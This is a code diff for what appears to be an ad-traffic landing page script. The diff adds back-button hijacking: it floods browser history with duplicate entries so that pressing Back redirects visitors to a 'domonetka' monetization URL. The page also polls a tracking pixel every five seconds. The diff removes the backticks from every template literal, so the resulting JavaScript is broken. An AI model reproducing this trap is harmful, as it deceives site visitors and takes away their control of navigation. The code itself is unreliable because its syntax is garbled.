@@ -54,28 +54,10 @@
         }
     }
 
-    // Обработка переходов для domonetka только при возврате назад
-    if (typeof domonetka !== 'undefined' && domonetka && domonetka.trim() !== '' && domonetka !== '{domonetka}') {
-        // Флаг для определения, что произошёл клик по якорной ссылке
-        let isAnchorNavigation = false;
-
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function() {
-                isAnchorNavigation = true;
-            });
-        });
-
-        history.replaceState({page: 'current'}, document.title, window.location.href);
-
+    // Обработка переходов для domonetka
+if (typeof domonetka !== 'undefined' && domonetka && domonetka.trim() !== '' && domonetka !== '{domonetka}') {
+    try {
         window.onpopstate = function (event) {
-            if (window.location.hash) {
-                return;
-            }
-            
-            if (isAnchorNavigation) {
-                isAnchorNavigation = false;
-                return;
-            }
             const currentUrlParams = new URLSearchParams(window.location.search);
             const newUrlParams = new URLSearchParams();
 
@@ -103,10 +85,17 @@
 
             newUrlParams.set('sub_id_22', 'domonetka');
 
-            const newUrl = `${domonetka}?${newUrlParams.toString()}`;
+            const newUrl = ${domonetka}?${newUrlParams.toString()};
             location.replace(newUrl);
         };
+
+        for (let i = 0; i < 10; i++) {
+            setTimeout(() => history.pushState({}, "", window.location.href), i * 50);
+        }
+    } catch (error) {
+        console.error(error);
     }
+}
 
     // Установка UTMCookies и интеграция Google Tag Manager
     function setUTMCookies() {
@@ -114,7 +103,7 @@
         utmParameters.forEach(param => {
             if (urlParams.has(param)) {
                 const value = urlParams.get(param);
-                document.cookie = `${param}=${encodeURIComponent(value)}; path=/; max-age=3600`;
+                document.cookie = ${param}=${encodeURIComponent(value)}; path=/; max-age=3600;
             }
         });
     }
@@ -124,7 +113,7 @@
         const gt = urlParams.get('gt');
         const gtmScript = document.createElement('script');
         gtmScript.async = true;
-        gtmScript.src = `https://www.googletagmanager.com/gtag/js?id=${gt}`;
+        gtmScript.src = https://www.googletagmanager.com/gtag/js?id=${gt};
         document.head.appendChild(gtmScript);
         window.dataLayer = window.dataLayer || [];
         window.gtag = function () {
@@ -137,13 +126,13 @@
     // Отслеживание времени нахождения на сайте (sub_id_21)
     if (subid && subid !== '{subid}') {
         const clickid = subid;
-        const address = `${window.location.protocol}//${window.location.hostname}?_update_tokens=1&sub_id=${clickid}`;
+        const address = ${window.location.protocol}//${window.location.hostname}?_update_tokens=1&sub_id=${clickid};
     
         var step = 5;
         var counter = 0;
         setInterval(function () {
             counter += step;
-            createPixel(`${address}&sub_id_21=${counter}`);
+            createPixel(${address}&sub_id_21=${counter});
         }, step * 1000);
     }
     
